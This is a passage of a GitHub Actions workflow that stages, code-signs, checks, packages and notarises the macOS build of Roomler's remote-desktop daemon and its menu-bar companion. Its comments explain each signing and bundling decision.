          path: target/aarch64-apple-darwin/release

      - name: Check the downloaded companion
        # Artifacts do not keep file modes, and this is the binary the .app
        # will launch, so check it is what the build produced.
        run: |
          set -euo pipefail
          f=target/aarch64-apple-darwin/release/roomler-desktop
          chmod +x "$f"
          desc="$(file "$f")"
          echo "$desc"
          echo "$desc" | grep -q 'Mach-O 64-bit executable arm64' \
            || { echo "::error::the companion artifact is not an arm64 Mach-O executable"; exit 1; }

      # ── The STABLE self-signed code-signing identity ────────────────────
      # TCC keys Screen Recording / Accessibility grants on the code-signing
      # IDENTITY. Ad-hoc (`--sign -`) mints a new identity every build, so
      # EVERY self-update wiped both grants and blinded the Mac until a human
      # re-granted — reproduced deterministically on rc.475 AND rc.476. One
      # self-signed cert, minted once and kept in repo secrets, gives a
      # stable designated requirement that grants survive. This is NOT
      # notarization and changes nothing for Gatekeeper (installs go via
      # `curl | sh`, which sets no quarantine xattr); it is purely identity
      # stability. Superseded file-by-file by the Developer ID path when the
      # six APPLE_* secrets ever land (that path `--force` re-signs last).
      #
      # Fallback is ad-hoc so artifacts-only runs and forks keep building;
      # a RELEASE tag without the secret gets a loud warning because it
      # re-introduces the wipe. Public cert (for fingerprint checks):
      # scripts/signing/macos/roomler-selfsign-cert.pem.
      - name: Import the stable self-signed signing identity
        env:
          SELFSIGN_P12_BASE64: ${{ secrets.MACOS_SELFSIGN_P12 }}
          SELFSIGN_PASSWORD: ${{ secrets.MACOS_SELFSIGN_PASSWORD }}
        run: |
          set -euo pipefail
          if [ -z "${SELFSIGN_P12_BASE64:-}" ] || [ -z "${SELFSIGN_PASSWORD:-}" ]; then
            echo 'SIGN_ID=-' >> "$GITHUB_ENV"
            if [[ "${{ needs.validate-version.outputs.is_release }}" == "true" ]]; then
              echo "::warning::MACOS_SELFSIGN_* secrets absent — RELEASING WITH AD-HOC SIGNATURES. Every self-update of this build will WIPE the Mac's TCC grants (Screen Recording + Accessibility)."
            else
              echo "self-sign secrets absent (artifacts-only run) — using ad-hoc"
            fi
            exit 0
          fi
          KEYCHAIN=selfsign.keychain
          KEYCHAIN_PASSWORD=$(openssl rand -hex 24)
          security create-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          security set-keychain-settings -lut 21600 "$KEYCHAIN"
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          echo "$SELFSIGN_P12_BASE64" | base64 -d > /tmp/selfsign.p12
          security import /tmp/selfsign.p12 -k "$KEYCHAIN" -P "$SELFSIGN_PASSWORD" \
            -T /usr/bin/codesign -T /usr/bin/security
          rm /tmp/selfsign.p12
          security list-keychain -d user -s "$KEYCHAIN" login.keychain
          security set-key-partition-list -S apple-tool:,apple: \
            -k "$KEYCHAIN_PASSWORD" "$KEYCHAIN" > /dev/null
          # A self-signed cert has NO trust settings, and both
          # `find-identity -v -p codesigning` and codesign itself require the
          # cert to pass codesigning TRUST evaluation — on a dev Mac the
          # Keychain Assistant adds that trust invisibly when it mints the
          # cert, in CI nobody does, so the rc.477 run imported the identity
          # ("1 identity imported.") and then could not SEE it. Trust the
          # committed public cert in the System keychain (runners have
          # passwordless sudo); `-p codeSign` scopes the trust to exactly the
          # policy we need.
          sudo security add-trusted-cert -d -r trustRoot -p codeSign \
            -k /Library/Keychains/System.keychain \
            scripts/signing/macos/roomler-selfsign-cert.pem
          # Identity presence is the gate: a p12 that imported but yields no
          # VALID signing identity must fail HERE, not as a cryptic codesign
          # error three steps later. Dump what the keychain does hold on
          # failure so the next person is not diagnosing blind.
          security find-identity -v -p codesigning "$KEYCHAIN" \
            | grep -q "Roomler Self-Signed Code Signing" \
            || {
              echo "::error::imported p12 yields no VALID 'Roomler Self-Signed Code Signing' identity"
              echo "--- all identities in $KEYCHAIN (unfiltered) ---"
              security find-identity "$KEYCHAIN" || true
              exit 1
            }
          echo 'SIGN_ID=Roomler Self-Signed Code Signing' >> "$GITHUB_ENV"
          echo "stable signing identity imported"

      - name: Stage .app bundle
        shell: bash
        run: |
          set -euo pipefail
          # FR-46 P5b: the .app, its executable and CFBundleName now all carry the
          # CURRENT name. CFBundleIdentifier stays `com.roomler.agent` on purpose —
          # it is not a retired name, it doubles as the launchd Label, and it is what
          # TCC attributes the grants to, so changing it would widen the blast radius
          # of a rename that already costs a re-approval at every Mac.
          BIN=target/aarch64-apple-darwin/release/roomlerd
          APP=stage/roomlerd.app
          mkdir -p "$APP/Contents/MacOS" "$APP/Contents/Resources"
          cp "$BIN" "$APP/Contents/MacOS/roomlerd"
          # Bundle every non-system dylib the binary loads into the .app, so
          # it is self-contained on a Mac that has never seen Homebrew.
          #
          # This is BY DEPENDENCY WALK, not by a hand-written list of libraries
          # we expect. The hand-written version is what shipped rc.452 broken:
          # it copied the FFmpeg dylibs (which someone remembered) and missed
          # libvpx (which nobody did), and dyld aborted at launch on the first
          # end-user Mac. A walk cannot miss one, and it keeps working when a
          # future feature links something new.
          #
          # A brew dylib's install name is an ABSOLUTE path
          # (/opt/homebrew/opt/<f>/lib/…), so an LC_RPATH alone cannot redirect
          # it — each reference has to be rewritten to @rpath explicitly.
          # Deps of deps are rewritten too: dyld resolves the whole graph at
          # launch, so one unrewritten leaf is still a crash.
          FW="$APP/Contents/Frameworks"
          mkdir -p "$FW"
          # Where an `@rpath/…` dependency can actually be found. A dylib built
          # with `--install-name-dir=@rpath` (the vendored FFmpeg) advertises
          # itself as `@rpath/libavcodec.63.dylib`, so `otool -L` on our binary
          # reports that and NOT a filesystem path.
          #
          # ⚠️ Treating `@…` as "already handled" is wrong and was caught by the
          # self-containment check below on the first VideoToolbox build:
          # libvpx came from Homebrew with an absolute install name and got
          # bundled, while the four FFmpeg dylibs were skipped as already-@rpath
          # and NOTHING copied them — the staged binary then died
          # `Library not loaded: @rpath/libavcodec.63.dylib`. `@rpath` says how
          # to LOOK for a library, never that it is present.
          RPATH_SEARCH="${FFMPEG_DIR:+$FFMPEG_DIR/lib}"
          bundle_deps() {
            local target="$1" dep base src
            # otool -L: line 1 is the file itself; field 1 of the rest is the path.
            #
            # Fed by process substitution, NOT a pipe: a piped `while` runs in a
            # SUBSHELL, so the `exit 1` below would kill only that subshell and
            # the step would sail on green. Same reason the /opt gate further
            # down is written this way.
            while read -r dep; do
              case "$dep" in
                /usr/lib/*|/System/*) continue ;;     # OS-provided
                @executable_path/*|@loader_path/*) continue ;;  # already bundle-relative
              esac
              base="$(basename "$dep")"
              case "$dep" in
                @rpath/*)
                  # Resolve against the trees we know we linked against. If it
                  # is already in Frameworks the reference is fine as-is.
                  [ -f "$FW/$base" ] && continue
                  src=""
                  for d in $RPATH_SEARCH; do
                    [ -f "$d/$base" ] && { src="$d/$base"; break; }
                  done
                  if [ -z "$src" ]; then
                    echo "::error::@rpath dep $dep is not in Frameworks and not in \$RPATH_SEARCH ($RPATH_SEARCH)"
                    exit 1
                  fi
                  ;;
                *) src="$dep" ;;
              esac
              if [ ! -f "$FW/$base" ]; then           # on-disk presence = the "seen" set
                echo "    bundling $src"
                cp -L "$src" "$FW/$base"             # -L: brew's opt path is a symlink into the Cellar
                chmod u+w "$FW/$base"
                install_name_tool -id "@rpath/$base" "$FW/$base"
                bundle_deps "$FW/$base"               # recurse into the copy's own deps
              fi
              # An already-@rpath reference needs no rewrite; an absolute one does.
              case "$dep" in
                @rpath/*) ;;
                *) install_name_tool -change "$dep" "@rpath/$base" "$target" ;;
              esac
            done < <(otool -L "$target" | tail -n +2 | awk '{print $1}')
          }
          echo "=== bundling non-system dylibs ==="
          install_name_tool -add_rpath "@executable_path/../Frameworks" "$APP/Contents/MacOS/roomlerd"
          bundle_deps "$APP/Contents/MacOS/roomlerd"
          ls -1 "$FW" 2>/dev/null || echo "    (none needed)"

          # install_name_tool invalidates the linker's ad-hoc signature, and an
          # arm64 Mach-O with a broken signature is killed by the kernel at
          # exec. Xcode's tool re-signs automatically, but do it explicitly so
          # the artifact does not depend on that behaviour. In `full` mode the
          # codesign steps below replace these with the Developer ID identity.
          # $SIGN_ID is the STABLE self-signed identity (or "-" ad-hoc
          # fallback) — see the import step for why stability matters (TCC).
          find "$APP" -type f \( -name '*.dylib' -o -name 'roomlerd' \) \
            -exec codesign --force --timestamp=none --sign "$SIGN_ID" {} \;

          echo "=== GATE: no Mach-O in the .app may reference a non-system path ==="
          # The `--version` run below is NOT sufficient on its own and never
          # was: the runner has Homebrew, so a binary that depends on it starts
          # here and dies on the user's machine. That is precisely how rc.452
          # shipped. This scan reads the load commands themselves, so it is
          # independent of what happens to be installed on the builder.
          bad=0
          # Process substitution, NOT a pipe: a `while` on the right of a pipe
          # runs in a subshell and `bad` would be lost on the way out.
          while IFS= read -r f; do
            refs="$(otool -L "$f" 2>/dev/null | tail -n +2 | awk '{print $1}' \
                    | grep -E '^/(opt|usr/local)/' || true)"
            if [ -n "$refs" ]; then
              echo "::error::$f loads paths absent from a clean Mac:"
              echo "$refs" | sed 's/^/    /'
              bad=1
            fi
          done < <(find "$APP" -type f)
          [ "$bad" -eq 0 ] || exit 1
          echo "  clean — every load command is /usr/lib, /System or @rpath."

          echo "=== self-containment check: run it with Homebrew HIDDEN ==="
          # macos-15 is arm64, so the staged binary runs here. Hiding the brew
          # prefix for the duration makes this an honest end-user simulation
          # rather than a check the builder's own environment can satisfy.
          # Restore BEFORE acting on the result, so a failure cannot leave the
          # runner without its Homebrew tree.
          hidden=0
          if [ -d /opt/homebrew/opt ]; then
            mv /opt/homebrew/opt /opt/homebrew/opt.hidden
            hidden=1
          fi
          rc=0
          "$APP/Contents/MacOS/roomlerd" --version || rc=$?
          [ "$hidden" -eq 1 ] && mv /opt/homebrew/opt.hidden /opt/homebrew/opt
          if [ "$rc" -ne 0 ]; then
            echo "::error::the staged binary does not start without Homebrew (exit $rc) — it is not self-contained"
            exit 1
          fi
          cp agents/roomlerd/packaging/macos/com.roomler.agent.plist "$APP/Contents/Resources/"
          # The privileged half's plist rides along in Resources; the
          # postinstall only installs it into /Library/LaunchDaemons when the
          # operator has opted in. Staged unconditionally so enabling the
          # daemon never requires a different package.
          cp agents/roomlerd/packaging/macos/com.roomler.daemon.plist "$APP/Contents/Resources/"
          # The companion's LaunchAgent rides here too — the postinstall reads
          # every plist it installs out of this one directory.
          cp agents/roomlerd/packaging/macos/com.roomler.desktop.plist "$APP/Contents/Resources/"
          # The update half (root LaunchDaemon, DEFAULT ON, opt-out marker
          # /etc/roomler/disable-auto-update). Owns check+download+
          # install so no agent process ever execs its own replacement.
          cp agents/roomlerd/packaging/macos/com.roomler.update.plist "$APP/Contents/Resources/"
          cat > "$APP/Contents/Info.plist" <<PLIST
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
              <key>CFBundleExecutable</key>          <string>roomlerd</string>
              <key>CFBundleIdentifier</key>          <string>com.roomler.agent</string>
              <key>CFBundleName</key>                <string>Roomler Daemon</string>
              <key>CFBundleShortVersionString</key>  <string>${VERSION}</string>
              <key>CFBundleVersion</key>             <string>${VERSION}</string>
              <key>CFBundlePackageType</key>         <string>APPL</string>
              <key>LSMinimumSystemVersion</key>      <string>${MACOS_FLOOR}</string>
              <key>LSUIElement</key>                 <true/>
              <key>NSPrincipalClass</key>            <string>NSApplication</string>
              <key>NSScreenCaptureUsageDescription</key>
                  <string>Roomler Daemon captures the screen to stream it to an authorised remote controller.</string>
              <key>NSAppleEventsUsageDescription</key>
                  <string>Roomler Daemon injects input events on behalf of an authorised remote controller.</string>
          </dict>
          </plist>
          PLIST

          # SEAL THE BUNDLE LAST — after every file is in place.
          #
          # The per-file signing above is what lets the binary exec for the
          # self-containment check, but signing a bundle's MAIN EXECUTABLE makes
          # codesign seal the whole BUNDLE: it writes
          # Contents/_CodeSignature/CodeResources covering the files present at
          # that moment. Both plists and Info.plist are written afterwards, so
          # that seal was false the instant it was created.
          #
          # rc.453 and rc.454 shipped exactly that; rc.452, which predates the
          # ad-hoc signing, carries no _CodeSignature at all and installed
          # cleanly on a real Mac. Re-sealing after the last write is the fix,
          # and it is what the Developer ID path below already does by running
          # last.
          codesign --force --timestamp=none --sign "$SIGN_ID" "$APP"
          # A seal that does not match its contents is exactly the bug above, so
          # assert rather than assume. `--strict` makes codesign check the
          # sealed resources instead of only the signature's own integrity.
          codesign --verify --strict --verbose=2 "$APP" || {
            echo "::error::the .app's signature does not match its contents"
            exit 1
          }
          # When the stable identity is in play, assert it actually SIGNED —
          # an env var lost between steps would silently ship ad-hoc and
          # re-introduce the per-update TCC wipe.
          if [ "$SIGN_ID" != "-" ]; then
            # ⚠️ Authority= lines only appear at --verbose=2 and above; plain
            # `-dv` (verbosity 1) NEVER prints them, so the rc.478 assert
            # failed on a perfectly-signed bundle. Same lesson as the smoke's
            # own history: an assert that can't distinguish pass from fail
            # must dump what it actually saw.
            codesign -d --verbose=2 "$APP" 2>&1 | grep -q "Authority=Roomler Self-Signed Code Signing" || {
              echo "::error::bundle is not signed by the stable identity (Authority missing)"
              echo "--- codesign -d --verbose=2 output ---"
              codesign -d --verbose=2 "$APP" 2>&1 || true
              exit 1
            }
            echo "  sealed with the stable identity"
          fi

      - name: Stage the desktop companion (.app)
        shell: bash
        run: |
          set -euo pipefail
          # A Tauri app must be a real bundle on macOS — it owns a menu-bar item
          # and a WKWebView, and both want bundle identity (and LSUIElement, to
          # stay out of the Dock). Hand-staged rather than built with
          # `cargo tauri build` for the same reason the Windows lane uses plain
          # `cargo build`: no Tauri toolchain on the runner, and the frontend is
          # already embedded via `custom-protocol`.
          DESK=stage/Roomler.app
          mkdir -p "$DESK/Contents/MacOS" "$DESK/Contents/Resources"
          cp target/aarch64-apple-darwin/release/roomler-desktop "$DESK/Contents/MacOS/roomler-desktop"
          cp agents/roomler-desktop/icons/icon.png "$DESK/Contents/Resources/icon.png"
          cat > "$DESK/Contents/Info.plist" <<PLIST
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
              <key>CFBundleExecutable</key>          <string>roomler-desktop</string>
              <key>CFBundleIdentifier</key>          <string>ai.roomler.agent-tray</string>
              <key>CFBundleName</key>                <string>Roomler</string>
              <key>CFBundleShortVersionString</key>  <string>${VERSION}</string>
              <key>CFBundleVersion</key>             <string>${VERSION}</string>
              <key>CFBundlePackageType</key>         <string>APPL</string>
              <key>CFBundleIconFile</key>            <string>icon.png</string>
              <key>LSMinimumSystemVersion</key>      <string>${MACOS_FLOOR}</string>
              <!-- Menu-bar only: no Dock tile, no app-switcher entry. -->
              <key>LSUIElement</key>                 <true/>
              <key>NSHighResolutionCapable</key>     <true/>
          </dict>
          </plist>
          PLIST

          # Seal AFTER every file is in place — same ordering rule as the agent
          # bundle, where signing first produced a _CodeSignature that no longer
          # matched its contents. Same stable identity as the agent: the
          # companion holds no TCC grants today, but a future one (e.g.
          # notifications) should not start from the wipe-per-update state.
          codesign --force --timestamp=none --sign "$SIGN_ID" "$DESK"
          codesign --verify --strict "$DESK" || {
            echo "::error::the companion .app's signature does not match its contents"
            exit 1
          }
          # It links only system frameworks; assert that rather than assume it,
          # since the agent bundle taught us what an un-checked dylib costs.
          bad="$(otool -L "$DESK/Contents/MacOS/roomler-desktop" | tail -n +2 | awk '{print $1}' \
                 | grep -E '^/(opt|usr/local)/' || true)"
          [ -z "$bad" ] || { echo "::error::companion loads non-system paths:"; echo "$bad"; exit 1; }
          # dyld/exec smoke, HARD-BOUNDED: `|| true` guards the exit code,
          # not a hang — once #659 made the companion actually START, this
          # probe launched a Tauri menu-bar event loop that never exits and
          # pinned the job until timeout (run 32738472108: 20+ min stuck
          # here; previously the binary failed fast, so the line "worked").
          # Background + kill keeps the probe's only real value (a dyld
          # crash still surfaces in the log) without trusting the binary
          # to ever return. macOS runners lack GNU `timeout` natively, so
          # do it by hand.
          "$DESK/Contents/MacOS/roomler-desktop" --version 2>/dev/null &
          probe=$!
          sleep 5
          kill -9 "$probe" 2>/dev/null || true
          wait "$probe" 2>/dev/null || true
          echo "  companion staged: $(du -h "$DESK/Contents/MacOS/roomler-desktop" | cut -f1)"

      - name: Import signing certs
        if: steps.apple.outputs.mode == 'full'
        run: |
          set -euo pipefail
          KEYCHAIN=build.keychain
          KEYCHAIN_PASSWORD=$(openssl rand -hex 24)

          security create-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          security set-keychain-settings -lut 21600 "$KEYCHAIN"
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"

          echo "$APP_P12_BASE64" | base64 -d > /tmp/app.p12
          security import /tmp/app.p12 -k "$KEYCHAIN" -P "$CERT_PASSWORD" \
            -T /usr/bin/codesign -T /usr/bin/security

          echo "$INSTALLER_P12_BASE64" | base64 -d > /tmp/installer.p12
          security import /tmp/installer.p12 -k "$KEYCHAIN" -P "$CERT_PASSWORD" \
            -T /usr/bin/productbuild -T /usr/bin/security

          security list-keychain -d user -s "$KEYCHAIN" login.keychain
          security set-key-partition-list -S apple-tool:,apple: \
            -k "$KEYCHAIN_PASSWORD" "$KEYCHAIN"

          rm /tmp/app.p12 /tmp/installer.p12

          # Print identities (harmless — just the CN, not the cert itself)
          security find-identity -v -p codesigning "$KEYCHAIN"

      - name: Codesign binary
        if: steps.apple.outputs.mode == 'full'
        run: |
          set -euo pipefail
          # Sign the bundled dylibs FIRST (inside-out) — the hardened runtime +
          # notarisation reject unsigned nested code.
          #
          # `--force` throughout: everything here already carries a signature.
          # arm64 Mach-Os are ad-hoc signed by the linker, and the staging step
          # re-signs whatever install_name_tool rewrote. Without --force,
          # codesign refuses with "is already signed" — and since the Apple
          # secrets have never been configured, this whole branch has never
          # executed, so nothing would have caught it but a release.
          find stage/roomlerd.app/Contents/Frameworks -type f -name '*.dylib' -print0 \
            | while IFS= read -r -d '' dylib; do
                codesign --force --sign "Developer ID Application" --options runtime --timestamp "$dylib"
              done
          codesign --force --sign "Developer ID Application" \
                   --options runtime --timestamp \
                   --entitlements agents/roomlerd/packaging/macos/entitlements.plist \
                   "stage/roomlerd.app/Contents/MacOS/roomlerd"

          codesign --force --sign "Developer ID Application" \
                   --options runtime --timestamp \
                   "stage/roomlerd.app"

          # The CLI shim ships in the same .pkg, outside the bundle. Sign it
          # HERE: nothing may `cargo build` after this point (a relink strips
          # signatures), and pkgbuild harvests it in the very next step.
          codesign --force --sign "Developer ID Application" \
                   --options runtime --timestamp \
                   "target/aarch64-apple-darwin/release/roomler-shim"

          # The desktop companion ships in the SAME .pkg (payload/Applications),
          # and it was sealed earlier with $SIGN_ID -- the stable SELF-SIGNED
          # identity, `--timestamp=none`, no hardened runtime. That is correct
          # for an unsigned-fallback build and FATAL here: Apple's notary
          # service refuses a nested bundle on any one of those three counts,
          # and this payload tripped all three. Re-seal it with the real
          # identity, inside-out, BEFORE `cp -R stage/Roomler.app` runs.
          #
          # Field evidence (2026-09-08, the first run that ever had Apple
          # credentials): roomlerd.app and roomler-shim were correctly
          # Developer-ID-signed and the .pkg itself carried "Developer ID
          # Installer: G ROX EOOD", yet notarisation still returned
          # `status: Invalid` -- because Roomler.app inside it was self-signed.
          find "stage/Roomler.app/Contents" -type f -name '*.dylib' -print0 2>/dev/null \
            | while IFS= read -r -d '' nested; do
                codesign --force --sign "Developer ID Application" \
                         --options runtime --timestamp "$nested"
              done
          codesign --force --sign "Developer ID Application" \
                   --options runtime --timestamp \
                   "stage/Roomler.app"
          codesign --verify --strict "stage/Roomler.app"

      # Every Mach-O this .pkg ships must run on its declared floor. The
      # dylibs carry their own minimum macOS (on 0.4.115: libvpx and the three
      # FFmpeg libs 14.0, the Rust binaries 11.0), and a runner-image move
      # raises it without a word: Homebrew pours the bottle built for the
      # runner's macOS. Fail the build instead of shipping a daemon that dies
      # at launch on the Macs the installer gate still lets in.
      - name: Check the bundle runs on its declared minimum macOS
        shell: bash
        run: |
          set -euo pipefail
          # LC_BUILD_VERSION's minos, or the legacy LC_VERSION_MIN_MACOSX.
          minos() { otool -l "$1" | awk '/LC_BUILD_VERSION|LC_VERSION_MIN_MACOSX/ {b = 1} b && ($1 == "minos" || $1 == "version") {print $2; exit}'; }
          # $1 <= $2, as dotted versions.
          le() { [ "$(printf '%s\n%s\n' "$1" "$2" | sort -t. -k1,1n -k2,2n -k3,3n | tail -n1)" = "$2" ]; }
          fail=0; n=0
          while IFS= read -r -d '' f; do
            case "$(file -b "$f")" in *Mach-O*) ;; *) continue ;; esac
            n=$((n + 1))
            m=$(minos "$f")
            if [ -z "$m" ]; then
              echo "::error::no minimum macOS recorded in $f"; fail=1
            elif le "$m" "$MACOS_FLOOR"; then
              echo "  ok   macOS $m  $f"
            else
              echo "::error::$f requires macOS $m, above this .pkg's floor of $MACOS_FLOOR"; fail=1
            fi
          done < <(find stage/roomlerd.app stage/Roomler.app \
                        target/aarch64-apple-darwin/release/roomler-shim -type f -print0)
          [ "$n" -gt 0 ] || { echo "::error::found no Mach-O files to check"; exit 1; }
          for p in stage/roomlerd.app/Contents/Info.plist stage/Roomler.app/Contents/Info.plist; do
            v=$(/usr/libexec/PlistBuddy -c 'Print :LSMinimumSystemVersion' "$p")
            [ "$v" = "$MACOS_FLOOR" ] || { echo "::error::$p declares LSMinimumSystemVersion $v, not $MACOS_FLOOR"; fail=1; }
          done
          echo "checked $n Mach-O files against macOS $MACOS_FLOOR"
          exit "$fail"

      - name: Build component + product pkg
        id: pkg
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p payload/Applications payload/Library/Roomler payload/usr/local/bin scripts dist
          # The DAEMON bundle goes to /Library/Roomler, NOT /Applications.
          #
          # It is a background service with no window and nothing to launch —
          # putting it in /Applications gave the user two Roomler icons, one of
          # which does nothing when double-clicked, and made the internal
          # internal daemon name look like a stale leftover next to `Roomler`.
          # /Library/<Vendor> is the conventional home for a helper the user
          # never opens, and Finder and Launchpad do not surface it.
          #
          # Still a BUNDLE, not a bare binary: TCC attributes Screen Recording
          # and Accessibility to a bundle identity, and Info.plist carries the
          # two usage descriptions macOS shows in the permission prompt.
          #
          # ⚠️ The path is part of the TCC identity, so this move costs every
          # existing Mac one re-grant. Unavoidable, and cheapest now while the
          # platform has almost no installs.
          cp -R stage/roomlerd.app payload/Library/Roomler/
          # The CLI. Until rc.454 the macOS payload was the .app and NOTHING
          # else — no `roomler` on PATH, so `roomler peers` was impossible on a
          # Mac even though the daemon carries the whole command surface. Same
          # ~150 KB shim the .deb and the MSI install; it re-execs
          # `<daemon> cli <args>`, resolving the bundle path on macOS because
          # the two binaries cannot be siblings here.
          cp target/aarch64-apple-darwin/release/roomler-shim payload/usr/local/bin/roomler
          chmod 755 payload/usr/local/bin/roomler
          # The menu-bar companion, and its LaunchAgent (installed by the
          # postinstall alongside the agent's).
          cp -R stage/Roomler.app payload/Applications/
          # `roomlerd` on PATH for command-surface parity with Linux and
          # Windows. A symlink, not a copy: the daemon binary lives inside the
          # bundle (its name is CFBundleExecutable and every launchd plist and
          # TCC grant is keyed to that path), so this is a convenience entry
          # point for `roomlerd enroll` / `--version`, not a second install.
          ln -s /Library/Roomler/roomlerd.app/Contents/MacOS/roomlerd \
            payload/usr/local/bin/roomlerd
          cp agents/roomlerd/packaging/macos/postinstall scripts/postinstall
          chmod 755 scripts/postinstall

          # Turn OFF bundle relocation. This is not a nicety.
          #
          # `pkgbuild --root` infers the .app as a BUNDLE COMPONENT and marks it
          # relocatable by default. PackageKit then asks LaunchServices where a
          # bundle with this identifier already lives and installs THERE,
          # ignoring the payload path. Measured on a CI runner:
          #
          #   PackageKit: Applications/roomlerd.app relocated to
          #               Users/runner/work/.../payload/Applications/roomlerd.app
          #
          # …i.e. it installed into the staging directory it had just been built
          # from. On a user's Mac the same rule redirects the install to any
          # indexed copy — an old one in ~/Downloads, a previous install in a
          # different folder — while both launchd plists and the postinstall go
          # on naming /Applications, so the install "succeeds" into a path
          # nothing else references.
          #
          # Everything here installs to a fixed absolute path, so relocation is
          # never wanted.
          pkgbuild --analyze --root payload component.plist
          i=0
          while /usr/libexec/PlistBuddy -c "Print :$i:BundleIsRelocatable" component.plist >/dev/null 2>&1; do
            /usr/libexec/PlistBuddy -c "Set :$i:BundleIsRelocatable false" component.plist
            i=$((i + 1))
          done
          [ "$i" -gt 0 ] || { echo "::error::pkgbuild --analyze found no bundle component to pin"; exit 1; }
          echo "pinned $i bundle component(s) to their payload path"
          plutil -p component.plist

          pkgbuild \
            --root payload \
            --component-plist component.plist \
            --scripts scripts \
            --identifier com.roomler.agent \
            --version "$VERSION" \
            --install-location / \
            component.pkg

          # Suffix-free name in both branches: signedness is VERIFIED by the
          # step below, not encoded in a filename. install.sh's
          # `aarch64-apple-darwin[^"]*\.pkg` regex matches either way, so
          # already-published `-unsigned` releases keep resolving too.
          artifact="dist/roomlerd-$VERSION-aarch64-apple-darwin.pkg"

          # The product archive carries an installer-enforced minimum macOS
          # (MACOS_FLOOR): a Mac below it refuses the update and keeps running
          # what it has. See the script's header.
          if [[ "${{ steps.apple.outputs.mode }}" == "full" ]]; then
            bash scripts/macos-productbuild-gated.sh component.pkg "$artifact" "$MACOS_FLOOR" "Developer ID Installer"
          else
            bash scripts/macos-productbuild-gated.sh component.pkg "$artifact" "$MACOS_FLOOR"
          fi

          echo "artifact=$artifact" >> "$GITHUB_OUTPUT"

      - name: Notarise
        if: steps.apple.outputs.mode == 'full'
        run: |
          set -euo pipefail
          mkdir -p ~/.appstoreconnect/private_keys
          KEY="$HOME/.appstoreconnect/private_keys/AuthKey_${APPLE_API_KEY_ID}.p8"
          echo "$APPLE_API_KEY_P8_BASE64" | base64 -d > "$KEY"

          # Capture the submission id, because `--wait` prints "status: Invalid"
          # and NOT ONE WORD about why. The per-file reasons live only in the
          # notarisation log, which is reachable solely by that id -- so without
          # this, a refusal is unfalsifiable: you know Apple said no, and cannot
          # tell which of a dozen causes it was. Measured 2026-09-08: the first
          # run that ever had credentials failed here, and diagnosing it needed
          # the workflow source rather than the log, which is the wrong way round.
          set +e
          # `--timeout` is NOT optional, and the value is load-bearing in BOTH
          # directions.
          #
          # Without it, `--wait` polls until something else kills it -- and that
          # something is the JOB timeout, which takes the runner down mid-poll:
          # no verdict, no `notarytool log`, and the whole diagnostic below
          # unreachable in exactly the case you most want it.
          #
          # Set it too LOW and it kills legitimate work. Measured 2026-09-08,
          # the first successful notarisation this project ever had: Apple's
          # queue took **71 minutes** to return `Accepted`, on a run whose
          # signing steps had all passed and with no incident on Apple's status
          # page. The job finished in 84 of its 90 allotted minutes -- six to
          # spare. An earlier draft of this fix used `--timeout 25m` and would
          # have aborted that run as a failure.
          #
          # So: job budget 180m (was 90 -- a 6-minute margin is not a margin),
          # notary bound 120m below it. A genuinely stuck submission now fails
          # with a REASON and ~60m of budget left to report it, while a merely
          # slow one still completes. For contrast, a structurally-invalid
          # package is refused in ~25 SECONDS -- fast rejection, slow
          # acceptance, so a long wait is evidence FOR the payload, not against.
          out=$(xcrun notarytool submit "${{ steps.pkg.outputs.artifact }}" \
                  --key "$KEY" \
                  --key-id "$APPLE_API_KEY_ID" \
                  --issuer "$APPLE_API_ISSUER_ID" \
                  --timeout 120m \
                  --wait 2>&1)
          rc=$?
          set -e
          printf '%s\n' "$out"

          if [ "$rc" -ne 0 ] || ! printf '%s\n' "$out" | grep -q 'status: Accepted'; then
            sub=$(printf '%s\n' "$out" | awk '/^ *id: /{print $2; exit}')
            # Do not call this "refused": a timeout and a rejection both land
            # here and they need different responses -- re-submit vs fix the
            # payload. Say which, and always print the id so the submission can
            # be re-queried by hand after the runner is gone.
            if printf '%s\n' "$out" | grep -qi 'timed out\|timeout'; then
              echo "::error::notarisation did not return a verdict within the timeout (submission ${sub:-unknown}) -- Apple's queue, not necessarily the payload. Re-query: xcrun notarytool info ${sub:-<id>}"
            else
              echo "::error::notarisation did not reach Accepted (submission ${sub:-unknown}) -- per-file reasons follow"
            fi
            if [ -n "$sub" ]; then
              xcrun notarytool log "$sub" \
                --key "$KEY" \
                --key-id "$APPLE_API_KEY_ID" \
                --issuer "$APPLE_API_ISSUER_ID" /dev/stdout || true
            fi
            exit 1
          fi

          # Retried: since 2026-10-12 the ticket fetch drops its connection on
          # GitHub's macOS runners after `Accepted` (exit 68; the script says why).
          bash "$GITHUB_WORKSPACE/scripts/signing/stapler-retry.sh" staple "${{ steps.pkg.outputs.artifact }}"

      # Verify rather than assume. `spctl -a -t install` exercises the exact
      # Gatekeeper path an end user hits and is the ONLY check that
      # distinguishes "signed" from "signed AND notarised" -- the distinction
      # that used to be able to ship silently.
      - name: Verify signature + notarisation
        if: steps.apple.outputs.mode == 'full'
        run: |
          set -euo pipefail
          PKG="${{ steps.pkg.outputs.artifact }}"

          echo "=== codesign (app bundle, strict) ==="
          codesign --verify --strict --verbose=2 stage/roomlerd.app

          echo "=== hardened runtime ==="
          codesign -d --verbose=2 stage/roomlerd.app 2>&1 | grep -q 'flags=.*runtime' \
            || { echo "::error::hardened runtime is NOT enabled on the app bundle -- notarisation would reject it"; exit 1; }

          echo "=== pkg signature ==="
          pkgutil --check-signature "$PKG"

          echo "=== stapled notarisation ticket ==="
          bash "$GITHUB_WORKSPACE/scripts/signing/stapler-retry.sh" validate "$PKG"

          echo "=== Gatekeeper (authoritative end-to-end check) ==="
          out="$(spctl -a -vvv -t install "$PKG" 2>&1 || true)"
          echo "$out"
          echo "$out" | grep -q 'source=Notarized Developer ID' \
            || { echo "::error::spctl did not report 'source=Notarized Developer ID'. The .pkg would be refused on end-user Macs."; exit 1; }

      - name: Warn on unsigned build
